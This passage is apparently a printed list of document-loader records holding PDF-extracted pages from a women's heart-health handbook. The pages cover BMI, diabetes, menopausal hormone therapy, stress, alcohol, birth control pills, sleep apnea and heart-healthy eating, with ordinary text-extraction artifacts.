              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 42}, page_content='ARE YOU AT A healthy WEIGHT?\\nBody Mass Index\\nHere is a chart for men and women that gives the BMI for various heights \\nand weights.*\\nHEIGHTBODY MASS INDEX\\n21 22 23 24 25 26 27 28 29 30 31\\n4’10”100 105 110 115 119 124 129 134 138 143 148\\n5’0” 107 112 118 123 128 133 138 143 148 153 158\\n5’1” 111 116 122 127 132 137 143 148 153 158 164\\n5’3” 118 124 130 135 141 146 152 158 163 169 175\\n5’5” 126 132 138 144 150 156 162 168 174 180 186\\n5’7” 134 140 146 153 159 166 172 178 185 191 198\\n5’9” 142 149 155 162 169 176 182 189 196 203 209\\n5’11” 150 157 165 172 179 186 193 200 208 215 222\\n6’1” 159 166 174 182 189 197 204 212 219 227 235\\n6’3” 168 176 184 192 200 208 216 224 232 240 248\\n* Weight is measured with underwear but no shoes.  \\nWhat Does Your BMI Mean?\\nNormal weight:  BMI = 18.5–24.9.  Good for you! Try not to gain weight.\\nOverweight:  BMI = 25–29.9.  Do not gain any weight, especially if yourwaist measurement is high.  You need to lose weight if you have two or more riskfactors for heart disease and are overweight, or have a high waist measurement.  \\nObese:  BMI = 30 or greater.  You need to lose weight.  Lose weight slowly—\\nabout \\n1/2to 2 pounds a week.  See your doctor or a nutritionist if you need help.  \\nSource:  “ Clinical Guidelines on the Identification, Evaluation, and Treatment \\nof Overweight and Obesity in Adults: The Evidence Report,” National Heart,\\nLung, and Blood Institute, in cooperation with the National Institute of \\nDiabetes and Digestive and Kidney Diseases, National Institutes of Health, \\nNIH Publication 98-4083, June 1998.  \\n— 41 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 43}, page_content='Small Changes Make a Big Difference \\nIf you need to lose weight, here is some good news:  a small\\nweight loss—just 5 to 10 percent of your current weight—willhelp to lower your risks of heart disease and other serious\\nmedical disorders.  The best way to take off pounds is to do so\\ngradually, by getting more physical activity and following a hearthealthy eating plan that is lower in calories and fat.  (High-fat\\nfoods contain more calories than the same amount of other foods,so they can make it hard for you to avoid excess calories.  But becareful—”low fat” doesn’t always mean low in calories.  Sometimesextra sugars are added to low-fat desserts, for example.)  For somewomen at very high risk, medication also may be necessary.\\nTo develop a weight-loss or weight-maintenance program that\\nworks best for you, consult with your doctor, a registered dietitian,or a qualified nutritionist.  For ideas on how to lose weight safelyand keep it off, see “Aim for a Healthy Weight” on page 81.\\nPhysical Inactivity\\nPhysical inactivity raises your risk of heart disease—more than youmight think.  It boosts your chances of developing heart-related\\nproblems even if you have no other risk factors.  It also increasesthe likelihood that you will develop other heart disease riskfactors, such as high blood pressure, diabetes, and overweight.Lack of physical activity leads to more doctor visits, morehospitalizations, and use of medicines for a variety of illnesses.\\nYet most women aren’t getting enough physical activity.\\nAccording to the Centers for Disease Control and Prevention, 60 percent of Americans are not meeting the recommendedlevels of physical activity.  Fully 16 percent of Americans are not\\n— 42 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 44}, page_content='active at all.  Overall, older people are less likely to be active than\\nyounger individuals, and women tend to be less physically active\\nthan men.  Physical inactivity is especially common among African\\nAmerican and Hispanic women.\\nFor women, physical inactivity also increases the risk of osteoporosis,\\nwhich in turn may increase the risk of broken bones.  This is worrisome,because women tend to become less physically active as they get older.\\nFortunately, research shows that as little as 30 minutes of moderate\\nactivity on most, and preferably all, days of the week helps to protectyour health.  This level of activity can reduce your risk of heartdisease as well as lower your chances of having a stroke, coloncancer, high blood pressure, diabetes, and other medical problems.\\nExamples of moderate activity are taking a brisk walk, raking leaves,\\ndancing, light weightlifting, house cleaning, or gardening.  If youprefer, you can divide your 30-minute activity into shorter periods ofat least 10 minutes each.  To find out about easy, enjoyable ways toboost your activity level, see “Learn New Moves” on page 92.  \\nDiabetes\\nDiabetes is a major risk factor for heart disease and stroke.  Morethan 65 percent of people who have diabetes die of some type ofcardiovascular disease.  Diabetic women are at especially high riskfor dying of heart disease and stroke.  Today, 7 million women in theUnited States have diabetes, including an estimated 3 million womenwho do not even know they have the disease.\\n— 43 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 45}, page_content='ANN\\n“I wasn’t aware of my risk factors, such as \\nbeing diabetic and having a family history of heart problems.”\\nThe type of diabetes that most commonly develops in adulthood istype 2 diabetes.  In type 2 diabetes, the pancreas makes insulin,but the body cannot use it properly and gradually loses the ability\\nto produce it.  Type 2 diabetes is a serious disease.  In addition to\\nincreasing the risk for heart disease, it is the #1 cause of kidneyfailure, blindness, and lower limb amputation in adults.  Diabetes\\ncan also lead to nerve damage and difficulties in fighting infection.\\nThe risk of type 2 diabetes rises after the age of 45.  You are\\nmuch more likely to develop this disease if you are overweight,especially if you have extra weight around your waist.  Other riskfactors include physical inactivity and a family history of diabetes.Type 2 diabetes also is more common among American Indians,Hispanic Americans, African Americans, Asian Americans, andPacific Islanders.  Women who have had diabetes duringpregnancy (gestational diabetes) or have given birth to a babyweighing more than 9 pounds are also more likely to develop type2 diabetes later in life.\\nSymptoms of diabetes may include fatigue, nausea, frequent\\nurination, unusual thirst, weight loss, blurred vision, frequentinfections, and slow healing of sores.  But type 2 diabetesdevelops gradually and sometimes has no symptoms.  Even if youhave no symptoms of diabetes, if you are overweight and haveany of the risk factors for type 2 diabetes, ask your doctor about\\n— 44 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 46}, page_content='getting tested for it.  You have diabetes if your fasting blood\\nglucose level is 126 mg/dL or higher.\\nIf you have diabetes, controlling your blood glucose (blood sugar)\\nlevels will help to prevent complications.  Because diabetes is sostrongly linked with heart disease, managing diabetes must include\\nkeeping certain factors under control (See “The ABCs of DiabetesControl” on page 47.).  Recommended levels of blood pressureand blood cholesterol control are lower for people with diabetesthan for most others.  Not smoking, being physically active, and\\ntaking aspirin daily (if your doctor recommends it) also are\\nimportant ways to prevent heart disease if you have diabetes.\\nSome people do not yet have diabetes but are at high risk for\\ndeveloping the disease.  They have a condition known as“prediabetes,” in which blood glucose levels are higher thannormal but not yet in the diabetic range.  But new research showsthat many people with prediabetes can prevent or delay thedevelopment of diabetes by making modest changes in diet andlevel of physical activity (See “Preventing Diabetes” on page 48.).\\nPeople who are prediabetic also have a 50 percent greater\\nchance of having a heart attack or stroke than those who havenormal blood glucose levels.  If you are prediabetic, you’ll need to pay close attention to preventing or controlling blood pressure,high blood cholesterol, and other risk factors for heart disease.\\n— 45 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 47}, page_content='“AT THE TIME, IT NEVER OCCURRED \\nTO ME THAT I COULD BE HAVING A HEART ATTACK.  I THINK ABOUT\\nHEART DISEASE EVERYDAY NOW.”\\n—Sharon\\n— 46 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 48}, page_content='THE ABCs OF DIABETES \\nIf you have diabetes, three key steps can help you lower yourcontrol\\nrisk of heart attack and stroke.  Follow these ABCs: \\nAis for the A1C test, which is short for hemoglobin A1C.  This test\\nmeasures your average blood glucose (blood sugar) over the last \\n3 months.  It lets you know if your blood glucose level is under control.\\nGet this test at least twice a year.  The number to aim for is below 7.\\nBis for blood pressure .  The higher your blood pressure, the\\nharder your heart has to work.  Get your blood pressure measured at\\nevery doctor’s visit.  The numbers to aim for are below 130/80 mmHg.\\nCis for cholesterol .  LDL, or “bad” cholesterol, builds up and clogs\\nyour arteries.  Get your LDL cholesterol tested at least once a year.\\nThe number to aim for is below 100 mg/dL.  Your doctor may adviseyou to aim for an even lower target number, for example, less than 70. \\nBe sure to ask your doctor these questions: \\n■What are my ABC numbers?\\n■What should my ABC target numbers be?\\n■What actions should I take to reach my ABC target numbers?\\nTo lower your risk of heart attack and stroke, also\\ntake these steps:\\n■Be physically active every day.\\n■Follow your doctor’s advice about the type of physical activity\\nthat’s best for you.\\n■Eat less salt and sodium, saturated fat, trans fat, and cholesterol.\\n■Eat more fiber.  Choose fiber-rich whole grains, fruits,vegetables, and beans.\\n■Stay at a healthy weight.\\n■If you smoke, stop.\\n■Take medicines as prescribed.\\n■Ask your doctor about taking aspirin.\\n■Ask others to help you manage your diabetes.\\n— 47 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 49}, page_content='preventing DIABETES \\nIf you have “prediabetes”—higher than normal glucose levels—\\nyou are more likely to develop type 2 diabetes.  But you can\\ntake steps to improve your health and delay or possibly preventdiabetes.  A recent study showed that many overweight, prediabeticpeople dramatically reduced the risk of developing diabetes byfollowing a lower fat, lower calorie diet and getting 30 minutesof physical activity at least 5 days per week.  The following aresome encouraging results of the study:\\n■Overall, people who achieved a 5 to 7 percent weight loss\\n(about 10 to 15 pounds) through diet and increased physicalactivity (usually brisk walking) reduced their risk of diabetes by\\n58 percent over the next 3 years.\\n■For people over age 60, these lifestyle changes reduced the\\nrisk of developing diabetes by 71 percent.\\n■Benefits were seen in all of the racial and ethnic groups whoparticipated in the study—Caucasians, African Americans,Hispanics, American Indians, Asian Americans, and Pacific\\nIslanders.\\n■People taking the diabetes drug metformin (Glucophage®)\\nreduced their risk of developing the disease by 31 percent.\\nThese findings suggest that you can act to prevent or delay\\ndiabetes, even if you are at high risk for the disease.  For moreinformation on how to choose and cook low-fat foods, get morephysical activity, and achieve a healthy weight, see “TakingControl” on page 60.\\n— 48 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 50}, page_content='OTHER FACTORS THAT affect\\nHEART DISEASE \\nMenopausal Hormone Therapy:  What Every Woman\\nNeeds TMo Know\\nenopausal hormone therapy once seemed\\nthe answer for many of the conditions women\\nface as they age.  It was thought that hormone\\ntherapy could ward off heart disease, osteoporosis, and cancer,while improving women’s quality of life.\\nBut beginning in July 2002, findings emerged from clinical trials that\\nshowed this was not so.  In fact, long-term use of hormone therapyposes serious risks and may increase the risk of heart attack and stroke.\\nThe findings come from the Women’s Health Initiative (WHI), launched in\\n1991 to test ways to prevent a number of medical disorders inpostmenopausal women.  It consists of a set of clinical studies onhormone therapy, diet modification, and calcium and vitamin Dsupplements; an observational study; and a community prevention study.\\nThe two hormone therapy clinical studies were both stopped early\\nbecause of serious risks and the failure to prevent heart disease.One of the hormone studies involved 16,608 postmenopausalwomen with a uterus who took either estrogen-plus-progestin therapy\\nor a placebo.  (The added progestin protects women against uterine\\ncancer.  A placebo is a substance that looks like the real drug buthas no biologic effect.)  The other study involved 10,739 womenwho had had a hysterectomy and took estrogen alone or a placebo.The estrogen used in the WHI was conjugated equine estrogens(0.625 mg daily), and the progestin was medroxyprogesteroneacetate (2.5 mg daily).\\n— 49 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 51}, page_content='In brief, the studies concluded the following:\\nEstrogen-plus-progestin therapy increased women’s risk\\nfor heart attacks, stroke, blood clots, and breast cancer.  It also\\ndoubled the risk of dementia and did not protect women against\\nmemory loss.\\nHowever, the estrogen-plus-progestin therapy had some benefits:  \\nIt reduced the risk for colorectal cancer and fractures.  It alsorelieved menopausal symptoms, such as hot flashes and nightsweats, in women who suffered from them.  But the study found\\nthat estrogen plus progestin did not improve women’s overallquality of life.\\nEstrogen-alone therapy increased the risk for stroke and\\nvenous thrombosis (blood clot, usually in one of the deep veins\\nof the legs).  It had no effect on heart disease and colorectalcancer, and it did not increase the risk of breast cancer.Estrogen alone gave no protection against memory loss, andthere were more cases of dementia in those who took the therapythan those on the placebo, although the increase was not statisticallysignificant.  Estrogen alone reduced the risk for fractures.\\nThe research showed that both types of medication—estrogen\\nalone and estrogen with progestin—increased the risk ofdeveloping urinary incontinence, which is the inability to “holdin” urine.  For women who already have the condition, thesemedications can worsen symptoms.\\nIf you are currently on or have taken menopausal hormone\\ntherapy, the findings can’t help but concern you.  It is important toknow, however, that those results apply to a large group of women.An individual woman’s increased risk for disease is quite small.For example, each woman in the estrogen-plus-progestin studyhad, on average, an increased risk of breast cancer of less thanone-tenth of 1 percent per year.\\n— 50 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 52}, page_content='While questions remain, these findings provide a basis for some\\nadvice about using hormone therapy:\\n■Estrogen alone, or estrogen plus progestin , should not\\nbe used to prevent heart disease.  Talk with your doctor aboutother ways of preventing heart attack and stroke, including\\nlifestyle changes and medicines such as cholesterol-lowering\\nstatins and blood pressure drugs.\\n■If you are considering using menopausal hormone therapy to\\nprevent osteoporosis, talk with your doctor about the possiblebenefits weighed against your personal risks for heart attack,\\nstroke, blood clots, and breast cancer.  Ask your doctor about\\nalternative treatments that are safe and effective in preventingosteoporosis and bone fractures.\\n■Do not take menopausal hormone therapy to prevent dementia\\nor memory loss.\\n■If you are considering menopausal hormone therapy to providerelief from menopausal symptoms such as hot flashes, talk withyour doctor about whether this treatment is right for you.  The\\nWHI did not test the short-term risks and benefits of using\\nhormone therapy for menopausal symptoms.  The U.S. Foodand Drug Administration recommends that menopausalhormone therapy be used at the lowest dose for the shortestperiod of time to reach treatment goals.\\nAnd remember, your risk for heart disease, stroke, osteoporosis,\\nand other conditions may change as you age, so review yourhealth regularly with your doctor.  New treatments that are safe\\nand effective may become available.  Stay informed.  If you\\nhave heart disease, see page 53 for more on menopausalhormone therapy.\\n— 51 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 53}, page_content='Stress and Depression\\nMany women are concerned about a possible connectionbetween stress and heart disease.  Many studies do report a\\nconnection for both women and men.  For example, the most\\ncommonly reported “trigger” for a heart attack is an emotionallyupsetting event, particularly one involving anger.  After a heartattack, people with higher levels of stress and anxiety tend tohave more trouble recovering.  Also, some common ways ofcoping with stress, such as overeating, heavy drinking, andsmoking, are clearly bad for your heart.\\nBut stress is not the only emotional influence on heart health.\\nDepression, too, is common in both women and men after aheart attack or heart surgery.  If you have had a heart attack orheart surgery and find yourself feeling depressed or “blue” for along time afterward, or if the sad feelings are severe, talk withyour doctor about ways to get help.  Also keep in mind thatsupport from family, friends, and other heart patients can help toimprove mood and adjustment to the recovery process.\\nThe good news is that sensible health habits can have a\\nprotective effect.  Regular physical activity not only relieves stressand depression but also can directly lower your risk of heartdisease.  Research also shows that participating in a stressmanagement program after a heart attack lessens the chances of further heart-related problems.  Stress management programs,as well as support groups for heart patients, can also help youdevelop new ways of handling everyday life challenges.\\nGood relationships count, too.  Developing strong personal ties\\nreduces the chances of developing heart disease.  Supportiverelationships also help to prolong people’s lives after a heartattack.  Religious or spiritual beliefs and activity are also linkedto longer survival among heart surgery patients.\\n— 52 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 54}, page_content='CAN YOUNGER  \\nSAFELY Twomen\\nAKE ESTROGEN THERAPY?\\nYou may have read media reports of updated WHI findings\\nsuggesting that estrogen-alone therapy may protect younger\\npostmenopausal women from heart disease.  Does this mean thatwomen in their 50s should start taking estrogen to protect theirhearts?  The answer is still no.  Here are the facts:\\nResearchers examined health outcomes for women in the WHI\\nstudy who had undergone hysterectomies and had takenestrogen-alone therapy.  For older women (ages 60 to 79) in thestudy, taking estrogen offered no overall protection from heart\\nattack or coronary death.  But among a subgroup of womenages 50 to 59, there was a suggestion of lower coronary heartdisease risk.  What do these findings mean for you?\\n■If you are considering using short-term estrogen-alone therapy\\naround the time of menopause, for the relief of hot flashes andother temporary symptoms, these findings may be somewhat\\nreassuring.\\n■But keep in mind that estrogen-alone therapy—the medication\\nused in this study—is appropriate only for women who havehad hysterectomies.  Other women cannot use it, because it\\ncan cause uterine cancer.\\n■This study does not change the overall conclusion from the\\nWHI:  Hormones should not be used for the prevention ofcoronary heart disease at any age.  Hormone therapy has\\nmany other risks, including stroke and blood clots.  There are\\nfar safer and more effective ways to protect your heart.\\n— 53 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 55}, page_content='“SINCE THE HEART ATTACK, I TRY TO WALK \\nAT LEAST 4 MILES A DAY AND AVOID FOODSHIGH IN CHOLESTEROL, SALT, SUGAR, AND FAT.I KNOW HOW IMPORTANT HEART HEALTH IS,SO I TRY TO PASS THIS KNOWLEDGE ANDHEALTHY LIFESTYLE ON TO MY KIDS.”  —Maria\\n“WATCHING MY MOM DEAL WITH HEART\\nDISEASE HAS TAUGHT ME TO BE MINDFULOF WHAT I DO EVERYDAY.” —Christen\\n— 54 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 56}, page_content='Much remains to be learned about the connections among stress,\\ndepression, and heart disease, but a few things are clear:staying physically active, developing a wide circle of supportive\\npeople in your life, and sharing your feelings and concerns with\\nthem can help you to be happier and live longer.\\nAlcohol \\nRecent research suggests that moderate drinkers are less likely todevelop heart disease than people who don’t drink any alcoholor who drink too much.  Small amounts of alcohol may helpprotect against heart disease by raising levels of HDL “good”\\ncholesterol.\\nIf you are a nondrinker, this is not a recommendation to start\\nusing alcohol.  Recent studies show that alcohol use increases the risk of breast cancer.  And, certainly, if you are pregnant,planning to become pregnant, or have another health conditionthat could make alcohol use harmful, you should not drink.Otherwise, if you’re already a moderate drinker, you may beless likely to have a heart attack.\\nIt is important, though, to weigh benefits against risks.  Talk with\\nyour doctor about your personal risks of breast cancer, heartdisease, and other health conditions that may be affected bydrinking alcohol.  With the help of your doctor, decide whethermoderate drinking to lower heart attack risk outweighs thepossible increased risk of breast cancer or other medical problems.\\nIf you do decide to use alcohol, remember that moderation is \\nthe key.  Heavy drinking causes many heart-related problems.More than three drinks per day can raise blood pressure andtriglyceride levels, while binge drinking can contribute to stroke.Too much alcohol also can damage the heart muscle, leading toheart failure.  Overall, people who drink heavily on a regularbasis have higher rates of heart disease than either moderatedrinkers or nondrinkers.\\n— 55 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 57}, page_content='WHAT ISmoderate DRINKING?\\nFor women, moderate drinking is defined as no more than \\none drink per day, according to the “Dietary Guidelines forAmericans.”  Count the following as one drink:\\n■12 ounces of beer (150 calories)\\n■5 ounces of wine (100 calories)\\n■11/2ounces of 80-proof distilled spirits (100 calories)\\nBirth Control Pills  \\nStudies show that women who use high-dose birth control pills (oral contraceptives) are more likely to have a heart attack orstroke because blood clots are more likely to form in the blood\\nvessels.  These risks are lessened once the birth control pill is\\nstopped.  Using the pill also may worsen the effects of other riskfactors, such as smoking, high blood pressure, diabetes, highblood cholesterol, and overweight.\\nMuch of this information comes from studies of birth control pills\\ncontaining higher doses of hormones than those commonly usedtoday.  Still, the risks of using low-dose pills are not fully known.Therefore, if you are now taking any kind of birth control pill or\\nare considering using one, keep these guidelines in mind:\\nDon’t mix smoking and “the pill.” If you smoke cigarettes,\\nmake a serious effort to quit.  If you cannot quit, choose a different\\nform of birth control.  Cigarette smoking boosts the risk of serioushealth problems from birth control pill use, especially the risk ofblood clots.  For women over the age of 35, the risk is particularlyhigh.  Women who use birth control pills should not smoke.\\n— 56 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 58}, page_content='DIANE \\n”I am on medication to control my high blood pressure\\nand cholesterol.  I keep regular appointments with mycardiologists and other doctors.  I haven’t had any \\nmore complications because of my heart disease.”  \\nPay attention to diabetes.  Levels of glucose, or blood sugar,\\nsometimes change dramatically in women who take birth controlpills.  Any woman who is diabetic or has a close relative who is\\ndiabetic should have regular blood sugar tests if she takes birth\\ncontrol pills.\\nWatch your blood pressure.  After starting to take birth\\ncontrol pills, your blood pressure may go up.  If your bloodpressure increases to 140/90 mmHg or higher, ask your doctorabout changing pills or switching to another form of birth control.Be sure to get your blood pressure checked at least once a year.\\nTalk with your doctor.  If you have heart disease or another\\nheart problem, or if you have suffered a stroke, birth control pillsmay not be a safe choice.  Be sure your doctor knows about theseor other serious health conditions before prescribing birth controlpills for you.\\n— 57 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 59}, page_content='Sleep Apnea\\nSleep apnea is a serious disorder in which a person briefly andrepeatedly stops breathing during sleep.  People with untreated\\nsleep apnea are more likely to develop high blood pressure,\\nheart attack, congestive heart failure, and stroke.\\nWomen are more likely to develop sleep apnea after menopause.\\nOther factors that increase risk are overweight and obesity,smoking, the use of alcohol or sleeping pills, and a family historyof sleep apnea.  Symptoms include heavy snoring and gaspingor choking during sleep, along with extreme daytime sleepiness.\\nIf you think you may have sleep apnea, ask your doctor for a \\ntest called polysomnography, which is usually performed\\novernight in a sleep center.  If you are overweight,\\neven a small weight loss—10 percent of your\\ncurrent weight—can relieve mild cases of sleep\\napnea.  Other self-help treatments include\\nquitting smoking and avoiding alcohol and\\nsleeping pills.  Sleeping on your side rather\\nthan on your back also may help.  Some\\npeople benefit from a mechanical device that\\nhelps maintain a regular breathing pattern\\nby increasing air pressure through\\nthe nasal passages via a face\\nmask.  For very serious cases,\\nsurgery may be needed.\\n— 58 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 60}, page_content='NEW RISKfactors? \\nWe know that major risk factors such as high blood cholesterol,\\nhigh blood pressure, and smoking boost heart disease risk.Researchers are studying other factors that might contribute toheart disease, including inflammation of the artery walls.  Severalemerging risk factors have been identified.  We don’t know forsure yet whether they lead to heart disease or whether treatingthem will reduce risk.  Although these possible risk factors are notrecommended for routine testing, ask your doctor whether youshould be tested for any of them.\\nC-reactive protein (CRP).  High levels of CRP may indicate\\ninflammation in the artery walls.  A simple blood test can measure\\nthe levels of CRP in the blood.  In many cases, a high CRP level isa sign of metabolic syndrome.  Treatment of the syndrome withlifestyle changes—weight loss and regular physical activity—canoften lower CRP.\\nHomocysteine.  High blood levels of this amino acid may\\nincrease risk for heart disease.  For women, homocysteine levelstend to rise after menopause.  It may be possible to lower elevatedlevels of homocysteine by getting plenty of folic acid and vitaminsB6 and B12 in your diet.\\nLp(a) protein.  This lipoprotein may make it easier for blood\\nclots to form.  Niacin, a cholesterol-lowering drug, may help tolower Lp(a) protein levels.\\n— 59 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 61}, page_content='TAKING control\\nsimply by leading a healthy lifestyle.  This section will offerNow that you know the risks for heart disease, what\\ncan you do to protect yourself?  The good news:\\nplenty.  Research shows that women can lower \\ntheir heart disease risk enormously—by as much as 82 percent—\\ndozens of down-to-earth ideas for making heart healthy practices\\npart of your daily life.\\nIf you already have heart disease, this section also will tell you about\\nthe kinds of tests, treatments, and medications that can help you stayhealthier.  You will also find out about the warning signs of a heart\\nattack and how to get fast, life-saving help.\\nFor all women, choosing a healthy lifestyle is extremely important.\\nRemember, heart disease is a woman’s greatest health threat.Adopting heart healthy habits can add years to your life—vital, active years.  Research from the Framingham Heart Study shows thatwomen who have no risk factors for heart disease live an average of 8 years longer than women with two or more risk factors.\\nSometimes, women are so good at taking care of others that\\nthey don’t take the time to keep themselves healthy and strong.Make time to take care of yourself.  Making healthy changes inyour daily habits will give you more energy and stamina to enjoythe people and activities you love.  And once you get started,keep it up.  Ask your family and friends to support you inmaintaining your new, heart healthy lifestyle.  You’re worth it!\\nResearch shows that women can lower \\ntheir heart disease risk enormously—by asmuch as 82 percent—simply by leading a\\nhealthy lifestyle.\\n— 60 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 62}, page_content='A FAMILY PLAN FOR HEART health\\nteenagers have at least one risk factor for hearWhen it comes to heart health, what’s good for \\nyou is good for your whole family—including its\\nyoungest members.  We now know that two-thirds of\\nt disease, from\\noverweight and “couch potato-itis” to unhealthy blood pressure\\nand cholesterol levels.  Even more disturbing, about 1 millionU.S. teens have metabolic syndrome, a cluster of risk factors thatgreatly increases the risk of a later heart attack.  By teachingyour children, grandchildren, or other young family members theimportance of eating well and getting regular physical activity,you’ll help them develop healthy habits for a lifetime.  Here aresome ways to get started:\\nSet a good example.  Adults have a big influence on children’s\\nand teens’ behavior—even though kids may not want to admit it!  Ifyou follow a healthy lifestyle, younger family members will be morelikely to do the same.  Let them see you eating nutritious snacks andenjoying outdoor activities.  Invite them to join you.\\nRaise “kitchen kids.” Show young children how to clean\\nfruits and veggies and combine them into salads.  When they\\nare old enough, teach them to use the cooktop, oven,\\nmicrowave, and toaster safely.  Show teens how to make simple,\\nhealthy dishes, such as pasta with vegetables and broiledchicken or fish.  Children who have basic cooking skillsappreciate food more and are more likely to try new dishes.\\nGet them moving.  Encourage your kids or grandkids to get\\nsome exercise throughout the day and especially on weekends.Go on outings with them that involve activities such as hiking,swimming, or bicycling.  Walk, bike, or jog with them to placesclose by.  Use your backyard or local park for basketball,baseball, football, badminton, or volleyball.  \\n— 61 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 63}, page_content='AN ACTION PLAN FOR heart HEALTHHere’s The Heart Truth :  If you eat a nutritious \\ndiet, engage in regular physical activity,\\nmaintain\\na healthy weight, and stop smoking, you will improve your\\nheart health.  Currently, only 3 percent of U.S. adults practice\\nthese “Big Four” heart healthy habits.  But it’s never too late to\\nstart.  No matter what heart disease risk factors you have—orhow many—you will greatly benefit from taking action in thesefour areas.  If you already have heart disease, you can lessen itsseverity by following this plan.\\nTrue, you may need to take other steps to prevent or control\\nheart disease.  For example, if you have diabetes, you also willneed to keep your blood sugar levels under control.  Butfollowing a heart healthy eating plan, controlling your weight,and engaging in more physical activity will help you keep your\\nblood sugar at healthy levels.  These steps will also help reduceyour chances of developing high blood pressure or high bloodcholesterol.  Whatever your current health conditions or habits,this action plan can make an enormously positive difference inyour heart health.  To find out how to get started, read on.\\n— 62 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 64}, page_content='Eat for Health\\nThe health of your heart has a lot to do with the foods you eat.The “Dietary Guidelines for Americans” give science-based\\nadvice for eating right and being physically active to maintain\\ngood health.  The guidelines recommend the following healthyeating plans:\\n■Emphasize fruits, vegetables, whole grains, and\\nfat-free or low-fat milk and milk products.\\n■Include lean meats, poultry, fish,beans, eggs, and nuts.\\n■Choose foods that are low insaturated fats, \\ntrans fats,\\ncholesterol, salt and sodium, and added sugars.\\n■Balance the calories you take inwith the calories you need.\\n— 63 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 65}, page_content='OLGA\\n“To keep my condition under control I make sure \\nto follow my doctor’s advice, take prescriptions,and get treatment when I need it.”\\nAlthough the “Dietary Guidelines for Americans” recommend an\\nexcellent basic menu for heart health, you may need to makesome additional changes in your diet if you have high blood\\npressure or high blood cholesterol.  You may want to work with a\\nregistered dietitian to help you make these changes.  A dietitiancan teach you about the eating plan that is best for you, determinea reasonable calorie level, and help you choose foods and planmenus.  A dietitian can also help you keep track of your progressand encourage you to stay on your eating plan.  Talk with yourdoctor about whether you should get a referral to a registereddietitian.  In the meantime, if you have high blood pressure orhigh blood cholesterol, the following page has some guidelines.\\n— 64 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 66}, page_content='HOW TO READ A NUTRITIONAL FACTS LABEL\\nMacaroni & Cheese\\nAmount Per ServingNutrition \\nServing Size 1 cup (228g)Facts\\nStartServings Per Container 2Here\\nCalories 250 Calories from Fat 1 10Check \\nCalories\\n% Daily Value*\\nVitamin A  4%\\nVitamin C  2%\\nCalcium 20%\\nIron 4%\\n* Percent Daily Values are based on a 2,000 calorie diet.\\n Your Daily values may be higher or lower depending on  your calorie needs.\\nCalories: 2,000 2,500\\nTotal Fat Less Than 65g 80g\\nSat Fat Less Than 20g 25g\\nCholosteral Less Than 300mg 300mg\\nSodium Less than 2,400mg 2,400mg\\nTotal Carbohydrate 300g 375g\\nDietary Fiber 25g 30gTotal Fat 12 g 18%\\nSaturated Fat 3g 15 %\\nTrans Fat 3g\\nCholesterol 30mg 10%\\nSodium 470mg 20%\\nTotal Carbohydrate 31g 10%\\nDietary Fiber 0g 0%\\nSugars 5g\\nProtein 5gQuick Guide to \\n% Daily Value\\nLimit These \\nNutrients• 5% or Less \\n   Is Low\\n• 20% or More  \\n    Is High\\nGet Enough\\nof TheseNutrients\\nFootnote\\n— 65 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 67}, page_content='Blood Pressure and the DASH Eating Plan\\nIf you have high blood pressure or prehypertension, you may\\nwant to follow an eating plan called “DASH.”  DASH stands for“Dietary Approaches to Stop Hypertension,” and the DASH\\neating plan emphasizes fruits, vegetables, fat-free or low-fat milk\\nand milk products, whole grain products, fish, poultry, beans,seeds, and nuts.  The DASH eating plan also contains lesssalt/sodium, sweets, added sugars, sugar containing beverages,fats, and red meats than the typical American diet.  This hearthealthy way of eating is also lower in saturated fat and cholesteroland is rich in nutrients that are associated with lowering bloodpressure—mainly potassium, magnesium, calcium, protein, and fiber.  \\nA major study found that people who followed this eating plan\\nreduced their blood pressure more than those who ate more“typical” American diets, which have fewer fruits andvegetables.  A second study found that people who followed theDASH eating plan and cut down on sodium had the biggestreductions in blood pressure.  (Salt, or sodium chloride, andother forms of sodium are found in many processed foods.)  So, for a truly winning combination, follow the DASH eatingplan and lower your sodium intake as much as possible.  Thestudy found that the less sodium people consumed, the more their blood 